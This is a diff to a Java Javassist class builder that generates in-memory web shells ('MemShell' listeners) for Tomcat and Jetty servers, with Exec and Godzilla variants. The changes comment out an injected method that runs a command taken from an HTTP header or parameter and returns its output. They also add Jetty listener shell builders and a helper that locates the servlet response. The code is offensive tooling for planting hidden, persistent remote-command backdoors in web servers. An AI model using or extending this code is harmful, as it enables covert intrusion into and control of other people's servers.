@@ -29,31 +29,28 @@ public class MSJavaClassBuilder {
         CtClass ctClass = classPool.getCtClass(cls.getName());
 
         // response
-        CtMethod responseCtMethod = ctClass.getDeclaredMethod("getResponse");
-        responseCtMethod.setBody("{Object request = getFieldValue($1, \"request\");\n" +
-                "Object httpServletResponse = getFieldValue(request, \"response\");\n" +
-                "return httpServletResponse;}");
+        tomcatListenerResponseMaker(ctClass);
 
         // run
-        CtMethod runCtMethod = ctClass.getDeclaredMethod("run");
-        runCtMethod.setBody("{try {\n" +
-                "    Object httpServletRequest = invokeMethod($1, \"getServletRequest\", new Class[]{}, new Object[]{});\n" +
-                "    Object header =  invokeMethod(httpServletRequest, \"getHeader\", new Class[]{String.class}, new Object[]{HEADER});\n" +
-                "    Object param = invokeMethod(httpServletRequest, \"getParameter\", new Class[]{String.class}, new Object[]{PARAM});\n" +
-                "    String str = null;\n" +
-                "    if (header != null) {\n" +
-                "        str = (String) header;\n" +
-                "    } else if (param != null) {\n" +
-                "        str = (String) param;\n" +
-                "    }\n" +
-                "    String result = exec(str);\n" +
-                "    Object response = getResponse(httpServletRequest);\n" +
-                "    invokeMethod(response, \"setStatus\", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});\n" +
-                "    Object writer = invokeMethod(response, \"getWriter\", new Class[]{}, new Object[]{});\n" +
-                "    invokeMethod(writer, \"println\", new Class[]{String.class}, new Object[]{result});\n" +
-                "} catch (Exception ignored) {\n" +
-//                "    ignored.printStackTrace();\n" +
-                "}}");
+//        CtMethod runCtMethod = ctClass.getDeclaredMethod("run");
+//        runCtMethod.setBody("{try {\n" +
+//                "    Object httpServletRequest = invokeMethod($1, \"getServletRequest\", new Class[]{}, new Object[]{});\n" +
+//                "    Object header =  invokeMethod(httpServletRequest, \"getHeader\", new Class[]{String.class}, new Object[]{HEADER});\n" +
+//                "    Object param = invokeMethod(httpServletRequest, \"getParameter\", new Class[]{String.class}, new Object[]{PARAM});\n" +
+//                "    String str = null;\n" +
+//                "    if (header != null) {\n" +
+//                "        str = (String) header;\n" +
+//                "    } else if (param != null) {\n" +
+//                "        str = (String) param;\n" +
+//                "    }\n" +
+//                "    String result = exec(str);\n" +
+//                "    Object response = getResponse(httpServletRequest);\n" +
+//                "    invokeMethod(response, \"setStatus\", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});\n" +
+//                "    Object writer = invokeMethod(response, \"getWriter\", new Class[]{}, new Object[]{});\n" +
+//                "    invokeMethod(writer, \"println\", new Class[]{String.class}, new Object[]{result});\n" +
+//                "} catch (Exception ignored) {\n" +
+////                "    ignored.printStackTrace();\n" +
+//                "}}");
 
         JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
 
@@ -71,15 +68,20 @@ public class MSJavaClassBuilder {
         CtClass ctClass = classPool.getCtClass(cls.getName());
 
         // response
-        CtMethod responseCtMethod = ctClass.getDeclaredMethod("getResponse");
-        responseCtMethod.setBody("{Object request = getFieldValue($1, \"request\");\n" +
-                "Object httpServletResponse = getFieldValue(request, \"response\");\n" +
-                "return httpServletResponse;}");
+        tomcatListenerResponseMaker(ctClass);
 
 
         JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
 
         return JavaClassModifier.toBytes(ctClass);
+    }
+
+    public void tomcatListenerResponseMaker(CtClass ctClass) throws Exception{
+        // response
+        CtMethod responseCtMethod = ctClass.getDeclaredMethod("getResponse");
+        responseCtMethod.setBody("{Object request = getFieldValue($1, \"request\");\n" +
+                "Object httpServletResponse = getFieldValue(request, \"response\");\n" +
+                "return httpServletResponse;}");
     }
 
     @Middleware(Middleware.Tomcat)
@@ -112,6 +114,55 @@ public class MSJavaClassBuilder {
     public byte[] springControllerExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
         return defaultOriginalMS(cls, javaClassHelper);
     }
+
+    /**
+     * Jetty
+     */
+    @Middleware(Middleware.Jetty)
+    @MemShell(MemShell.Listener)
+    @MemShellFunction(MemShellFunction.Exec)
+    public byte[] jettyListenerExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        ClassPool classPool = ClassPool.getDefault();
+        classPool.insertClassPath(new ClassClassPath(cls));
+        classPool.importPackage("javax.servlet.http");
+
+        CtClass ctClass = classPool.getCtClass(cls.getName());
+
+        // response
+        jettyListenerResponseMaker(ctClass);
+
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+
+        return JavaClassModifier.toBytes(ctClass);
+    }
+
+    @Middleware(Middleware.Jetty)
+    @MemShell(MemShell.Listener)
+    @MemShellFunction(MemShellFunction.Godzilla)
+    public byte[] jettyListenerGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        ClassPool classPool = ClassPool.getDefault();
+        classPool.insertClassPath(new ClassClassPath(cls));
+        classPool.importPackage("javax.servlet.http");
+
+        CtClass ctClass = classPool.getCtClass(cls.getName());
+
+        // response
+        jettyListenerResponseMaker(ctClass);
+
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+
+        return JavaClassModifier.toBytes(ctClass);
+    }
+
+    public void jettyListenerResponseMaker(CtClass ctClass) throws Exception{
+        // response
+        CtMethod responseCtMethod = ctClass.getDeclaredMethod("getResponse");
+        responseCtMethod.setBody("{Object channel = getFieldValue($1, \"_channel\");\n" +
+                "return getFieldValue(channel, \"_response\");}");
+    }
+
 
     public static byte[] defaultOriginalMS(Class cls, JavaClassHelper javaClassHelper) throws Exception {
         ClassPool classPool = ClassPool.getDefault();
